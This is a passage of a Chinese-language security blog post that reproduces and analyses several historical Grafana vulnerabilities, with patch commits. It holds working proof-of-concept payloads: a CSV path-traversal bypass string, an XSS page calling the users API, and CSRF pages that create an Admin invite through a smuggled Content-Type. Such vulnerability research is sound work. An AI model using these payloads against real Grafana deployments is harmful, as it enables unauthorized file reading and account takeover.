+
+<p>这里的<code>reqSignedIn</code>意味着需要登录</p>
+<p>然后到pkg&#x2F;api&#x2F;plugins.go:181</p>
+<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230809141406618.png" alt="image-20230809141406618"></p>
+<p>到pkg&#x2F;plugins&#x2F;manager&#x2F;manager.go:696，对name进行大&#x2F;小写转换，然后和PluginDir进行拼接，导致了目录穿越</p>
+<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230809141511148.png" alt="image-20230809141511148"></p>
+<h4 id="8-3-1"><a href="#8-3-1" class="headerlink" title="8.3.1"></a>8.3.1</h4><p>路由定义和8.1.0是一样的</p>
+<p>继续看到pkg&#x2F;api&#x2F;plugins.go:188，这里调用Markdown插件的代码有点不同</p>
+<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230809145815252.png" alt="image-20230809145815252"></p>
+<p>pkg&#x2F;api&#x2F;plugins.go:483</p>
+<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230809145906774.png" alt="image-20230809145906774"></p>
+<p>不过漏洞整体的流程和逻辑是一样的</p>
+<h3 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>8.3.2修复如下：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/grafana/grafana/commit/e0842b265f82806fde785c546f1637acdfaf5685">https://github.com/grafana/grafana/commit/e0842b265f82806fde785c546f1637acdfaf5685</a></p>
+<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230809150602387.png" alt="image-20230809150602387"></p>
+<p>对传入的路径参数用<code>mdFilepath</code>函数处理，而<code>mdFilepath</code>函数内是使用<code>filepath.Clean</code>进行处理，和CVE-2021-43798修复类似</p>
+<h2 id="CVE-2021-43815（路径穿越csv文件读取）"><a href="#CVE-2021-43815（路径穿越csv文件读取）" class="headerlink" title="CVE-2021-43815（路径穿越csv文件读取）"></a>CVE-2021-43815（路径穿越csv文件读取）</h2><h3 id="影响范围-3"><a href="#影响范围-3" class="headerlink" title="影响范围"></a>影响范围</h3><p><strong>Affected versions</strong>: 8.0.0-beta3 - 8.3.1<br><strong>Patched versions</strong>: 8.3.2</p>
+<h3 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>使用8.3.1版本，先进入容器，创建一个csv文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;id,name\n1,leixiao\n2,l3yx&quot;</span> &gt; /test.csv</span><br></pre></td></tr></table></figure>
+
+<p>按照<a target="_blank" rel="noopener" href="https://grafana.com/docs/grafana/latest/datasources/testdata/">TestData data source</a>的步骤添加TestData数据源，然后进入Explore页面，选择<code>TestData DB</code>，然后选择一个csv文件并抓包</p>
+<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230810004320427.png" alt="image-20230810004320427"></p>
+<p>修改<code>queries.csvFileName</code>字段可目录穿越读取任意csv文件</p>
+<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230810004815084.png" alt="image-20230810004815084"></p>
+<h3 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>一开始是看<a target="_blank" rel="noopener" href="https://github.com/grafana/grafana/security/advisories/GHSA-7533-c8qv-jm9m">官方github信息</a>得知漏洞url是<code>/api/ds/query</code>，然后直接从该路由入手分析漏洞，但发现定位到漏洞点有些困难，其中的功能点调用逻辑有点复杂，然后从<a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-43815">cve页面</a>找到漏洞的<a target="_blank" rel="noopener" href="https://github.com/grafana/grafana/commit/d6ec6f8ad28f0212e584406730f939105ff6c6d3">修复信息</a>，得知最后的漏洞点为<code>pkg/tsdb/testdatasource/csv_data.go</code>，然后由<code>loadCsvFile</code>函数倒推调用路径，但最终只推到<code>pkg/tsdb/testdatasource/scenarios.go:198</code></p>
+<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230810010326392.png" alt="image-20230810010326392"></p>
+<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230810010448109.png" alt="image-20230810010448109"></p>
+<p>看样子是先注册函数或功能，调用时在根据<code>ID</code>去动态调用对应的功能点。然后发现这些文件都在<code>testdatasource</code>这个目录，根据关键字很容易搜到<a target="_blank" rel="noopener" href="https://grafana.com/docs/grafana/latest/datasources/testdata/">官方文档</a>，按照文档测试并抓包，得到预期中的数据包，其中<code>scenarioId</code>字段也就对应各个功能的<code>ID</code></p>
+<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230810011415214.png" alt="image-20230810011415214"></p>
+<p>搞清楚调用逻辑后再正向分析一下漏洞。</p>
+<p>路由在pkg&#x2F;api&#x2F;api.go中定义：</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">r.Group(<span class="string">&quot;/api&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(apiRoute routing.RouteRegister)</span></span> &#123;</span><br><span class="line">  ...</span><br><span class="line">  apiRoute.Post(<span class="string">&quot;/ds/query&quot;</span>, authorize(reqSignedIn, ac.EvalPermission(ActionDatasourcesQuery)), bind(dtos.MetricRequest&#123;&#125;), routing.Wrap(hs.QueryMetricsV2))</span><br><span class="line">	...</span><br><span class="line">&#125;, reqSignedIn)</span><br></pre></td></tr></table></figure>
+
+<p>中间的调用逻辑很长而且有点复杂，直接跳过，到pkg&#x2F;tsdb&#x2F;testdatasource&#x2F;csv_data.go:46，这里就是处理<code>csv_file</code>的具体逻辑</p>
+<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230810013336028.png" alt="image-20230810013336028"></p>
+<p>pkg&#x2F;tsdb&#x2F;testdatasource&#x2F;csv_data.go:75，这里只是做了简单的正则判断便直接拼接路径，导致了目录穿越。这里的正则也可以轻易绕过：<code>xxx.csv/../../../../../../etc/passwd</code>，不过当前的环境是无法读取<code>/etc/passwd</code>文件的，在<code>LoadCsvContent</code>函数中是默认将文件以csv的格式进行读取，但是<code>/etc/passwd</code>最后一行有几个逗号，行之间逗号数不匹配会导致读取错误</p>
+<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230810013541777.png" alt="image-20230810013541777"></p>
+<p><code>/etc/hosts</code>倒是可以读取：</p>
+<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230810014730199.png" alt="image-20230810014730199"></p>
+<h3 id="漏洞修复-3"><a href="#漏洞修复-3" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><a target="_blank" rel="noopener" href="https://github.com/grafana/grafana/commit/d6ec6f8ad28f0212e584406730f939105ff6c6d3#diff-2482b47469df54a2bdcb0870bfca4ac5f190027bf13d0c404cbd470d226576e5">https://github.com/grafana/grafana/commit/d6ec6f8ad28f0212e584406730f939105ff6c6d3#diff-2482b47469df54a2bdcb0870bfca4ac5f190027bf13d0c404cbd470d226576e5</a></p>
+<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230810011703730.png" alt="image-20230810011703730"></p>
+<p>修复方法同CVE-2021-43813，并且正则更严谨了</p>
+<h2 id="CVE-2022-21702（Proxy-XSS）"><a href="#CVE-2022-21702（Proxy-XSS）" class="headerlink" title="CVE-2022-21702（Proxy XSS）"></a>CVE-2022-21702（Proxy XSS）</h2><h3 id="影响范围-4"><a href="#影响范围-4" class="headerlink" title="影响范围"></a>影响范围</h3><p><strong>Affected versions</strong>: 2.0.0-beta1 - 8.3.4<br><strong>Patched versions</strong>: 8.3.5, 7.5.15</p>
+<h3 id="漏洞复现-4"><a href="#漏洞复现-4" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>参考<a target="_blank" rel="noopener" href="https://github.com/grafana/grafana/security/advisories/GHSA-xc3p-28hw-q24g">官方说明</a>，很容易推断复现步骤：</p>
+<h4 id="数据源Proxy"><a href="#数据源Proxy" class="headerlink" title="数据源Proxy"></a>数据源Proxy</h4><p>使用8.3.1版本，创建一个基于HTTP的数据源，例如Elasticsearch，访问模式设置成<code>Server</code>，URL设置为攻击者可控的地址</p>
+<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230810031537183.png" alt="image-20230810031537183"></p>
+<p>在该URL的Web服务中放入XSS页面。Grafana的Cookie是HttpOnly的，所以无法获取Cookie，但是可以直接请求接口，例如xss.html：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">xhr.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;/api/org/users&quot;</span>, <span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript">xhr.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">if</span> (xhr.<span class="property">readyState</span> === <span class="title class_">XMLHttpRequest</span>.<span class="property">DONE</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">if</span> (xhr.<span class="property">status</span> === <span class="number">200</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">alert</span>(xhr.<span class="property">responseText</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">alert</span>(xhr.<span class="property">status</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;;</span></span><br><span class="line"><span class="language-javascript">xhr.<span class="title function_">send</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在<code>/datasources</code>页面可以抓包获取数据源的id，用id可以构造出如下地址：<code>/api/datasources/proxy/:id/xss.html</code></p>
+<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230810032245092.png" alt="image-20230810032245092"></p>
+<h3 id="漏洞修复-4"><a href="#漏洞修复-4" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><a target="_blank" rel="noopener" href="https://github.com/grafana/grafana/commit/27726868b3d7c613844b55cd209ca93645c99b85">https://github.com/grafana/grafana/commit/27726868b3d7c613844b55cd209ca93645c99b85</a></p>
+<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230810035135187.png" alt="image-20230810035135187"></p>
+<p>csp设置为sandbox</p>
+<h2 id="CVE-2022-21703（同站CSRF）"><a href="#CVE-2022-21703（同站CSRF）" class="headerlink" title="CVE-2022-21703（同站CSRF）"></a>CVE-2022-21703（同站CSRF）</h2><h3 id="影响范围-5"><a href="#影响范围-5" class="headerlink" title="影响范围"></a>影响范围</h3><p><strong>Affected versions</strong>: &gt;&#x3D;v3.0-beta1<br><strong>Patched versions</strong>: 8.3.5, 7.5.15</p>
+<h3 id="漏洞复现-5"><a href="#漏洞复现-5" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>参考 <a target="_blank" rel="noopener" href="https://jub0bs.com/posts/2022-02-08-cve-2022-21703-writeup/">CVE-2022-21703: cross-origin request forgery against Grafana</a></p>
+<p>使用8.3.1版本，POC所在地址和Grafana必须同站，如<a target="_blank" rel="noopener" href="http://127.0.0.1:8080/csrf.html%E5%92%8Chttp://127.0.0.1:3000/">http://127.0.0.1:8080/csrf.html和http://127.0.0.1:3000/</a> (Grafana)</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">function</span> <span class="title function_">csrf</span>(<span class="params">name, email</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> url = <span class="string">&quot;http://127.0.0.1:3000/api/org/invites&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> data = &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="string">&quot;name&quot;</span>: name,</span></span><br><span class="line"><span class="language-javascript">          <span class="string">&quot;loginOrEmail&quot;</span>: email,</span></span><br><span class="line"><span class="language-javascript">          <span class="string">&quot;role&quot;</span>: <span class="string">&quot;Admin&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">          <span class="string">&quot;sendEmail&quot;</span>: <span class="literal">false</span></span></span><br><span class="line"><span class="language-javascript">        &#125;;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> opts = &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">method</span>: <span class="string">&quot;POST&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">mode</span>: <span class="string">&quot;no-cors&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">credentials</span>: <span class="string">&quot;include&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">headers</span>: &#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;text/plain; application/json&quot;</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data)</span></span><br><span class="line"><span class="language-javascript">        &#125;;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">fetch</span>(url, opts);</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">csrf</span>(<span class="string">&quot;attacker&quot;</span>, <span class="string">&quot;attacker@example.com&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞分析-4"><a href="#漏洞分析-4" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>从<a target="_blank" rel="noopener" href="https://github.com/grafana/grafana/security/advisories/GHSA-cmf4-h3xc-jw8w">官方通告</a>就可以得知是邀请功能处的CSRF，即<a target="_blank" rel="noopener" href="http://127.0.0.1:3000/org/users/invite">http://127.0.0.1:3000/org/users/invite</a>  ，但我在测试时发现Grafana的Cookie的SameSite属性是Lax，即跨站POST请求是不会带Cookie的，所以直接放弃了<code>POST /api/org/invites</code>这个接口，我觉得这里是不会有CSRF漏洞的，然后接着找邀请功能是否有请求方法为GET的接口，也尝试了Method Override，但都无果。最后只能搜公开POC，于是找到文章 <a target="_blank" rel="noopener" href="https://jub0bs.com/posts/2022-02-08-cve-2022-21703-writeup/">CVE-2022-21703: cross-origin request forgery against Grafana</a></p>
+<p>文章中对这个漏洞的利用有个前提就是POC所在地址和Grafana<strong>同站</strong>，这一点确实是没有想到，有点觉得同站才能攻击甚至都不算漏洞。不过我从文章里还是学到很多东西。</p>
+<p>如果已经在同站的前提下，那么我第一步构造的POC会是这样：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://127.0.0.1:3000/api/org/invites&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;text/plain&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;<span class="symbol">&amp;#123;</span><span class="symbol">&amp;quot;</span>name<span class="symbol">&amp;quot;</span><span class="symbol">&amp;#58;</span><span class="symbol">&amp;quot;</span>test<span class="symbol">&amp;quot;</span><span class="symbol">&amp;#44;</span><span class="symbol">&amp;quot;</span>email<span class="symbol">&amp;quot;</span><span class="symbol">&amp;#58;</span><span class="symbol">&amp;quot;</span><span class="symbol">&amp;quot;</span><span class="symbol">&amp;#44;</span><span class="symbol">&amp;quot;</span>role<span class="symbol">&amp;quot;</span><span class="symbol">&amp;#58;</span><span class="symbol">&amp;quot;</span>Admin<span class="symbol">&amp;quot;</span><span class="symbol">&amp;#44;</span><span class="symbol">&amp;quot;</span>sendEmail<span class="symbol">&amp;quot;</span><span class="symbol">&amp;#58;</span>false<span class="symbol">&amp;#44;</span><span class="symbol">&amp;quot;</span>loginOrEmail<span class="symbol">&amp;quot;</span><span class="symbol">&amp;#58;</span><span class="symbol">&amp;quot;</span>test<span class="symbol">&amp;#46;</span>com<span class="symbol">&amp;quot;</span><span class="symbol">&amp;#125;</span>&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      history.<span class="title function_">pushState</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>实际发出的请求包如下：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/org/invites</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:3000</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://127.0.0.1:8080</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/plain</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://127.0.0.1:8080/</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>grafana_session=0ddf59e56f25e8815da0e1d2c937ab44</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>88</span><br><span class="line"></span><br><span class="line"><span class="language-actionscript">&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;test&quot;</span>,<span class="string">&quot;email&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;role&quot;</span>:<span class="string">&quot;Admin&quot;</span>,<span class="string">&quot;sendEmail&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;loginOrEmail&quot;</span>:<span class="string">&quot;test.com&quot;</span>&#125;=</span></span><br><span class="line"><span class="language-actionscript"></span></span><br></pre></td></tr></table></figure>
+
+<p>返回包是：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">415</span> Unsupported Media Type</span><br><span class="line">...</span><br><span class="line">[&#123;&quot;classification&quot;:&quot;ContentTypeError&quot;,&quot;message&quot;:&quot;Unsupported Content-Type&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>观察发现请求包的Json数据最后面多了一个<code>=</code>，但其实这是没影响的，服务端对Json的处理有一定程度的容错，这种case我曾经在其他漏洞赏金计划中发现过。真正导致利用失败的是<code>Content-Type: text/plain</code>，显然服务端期望的是Json，但是通过form表单提交数据的话，是无法设置<code>application/x-www-form-urlencoded</code>，<code>multipart/form-data</code>和<code>text/plain</code>以外的Content-Type的</p>
+<p>改用Fetch，并设置Content-Type：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> data = &#123; <span class="string">&quot;name&quot;</span>: <span class="string">&quot;test&quot;</span>, <span class="string">&quot;email&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;role&quot;</span>: <span class="string">&quot;Admin&quot;</span>, <span class="string">&quot;sendEmail&quot;</span>: <span class="literal">true</span>, <span class="string">&quot;loginOrEmail&quot;</span>: <span class="string">&quot;test.com&quot;</span> &#125;;</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">fetch</span>(<span class="string">&#x27;http://127.0.0.1:3000/api/org/invites&#x27;</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">credentials</span>: <span class="string">&quot;include&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">headers</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data)</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230810185059372.png" alt="image-20230810185059372"></p>
+<p>由于使用了自定义的请求头（Content-Type非<code>application/x-www-form-urlencoded</code>，<code>multipart/form-data</code>和<code>text/plain</code>），该请求就不是简单请求，那么就会触发预检请求，Grafana没有配置CORS，因此CORS预检将会失败，浏览器永远不会发送实际请求。</p>
+<p>我们可以将请求变成简单请求的同时在Content-Type中走私其他内容：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> data = &#123; <span class="string">&quot;name&quot;</span>: <span class="string">&quot;test&quot;</span>, <span class="string">&quot;email&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;role&quot;</span>: <span class="string">&quot;Admin&quot;</span>, <span class="string">&quot;sendEmail&quot;</span>: <span class="literal">true</span>, <span class="string">&quot;loginOrEmail&quot;</span>: <span class="string">&quot;test.com&quot;</span> &#125;;</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">fetch</span>(<span class="string">&#x27;http://127.0.0.1:3000/api/org/invites&#x27;</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">credentials</span>: <span class="string">&quot;include&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">headers</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;text/plain; application/json&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data)</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230810190826535.png" alt="image-20230810190826535"></p>
+<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230810190839995.png" alt="image-20230810190839995"></p>
+<p>这里虽然显示被同源策略阻止，但其实请求已经发送，阻止的只是响应数据的读取</p>
+<p>Grafana接受<code>text/plain; application/json</code>为Json是因为 pkg&#x2F;macaron&#x2F;binding&#x2F;binding.go:43</p>
+<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230810191929462.png" alt="image-20230810191929462"></p>
+<h3 id="漏洞修复-5"><a href="#漏洞修复-5" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>发现8.3.5并未解决这个漏洞，7.5.15已经修复，下面调试用的8.4.0</p>
+<p>pkg&#x2F;api&#x2F;org_invite.go:34</p>
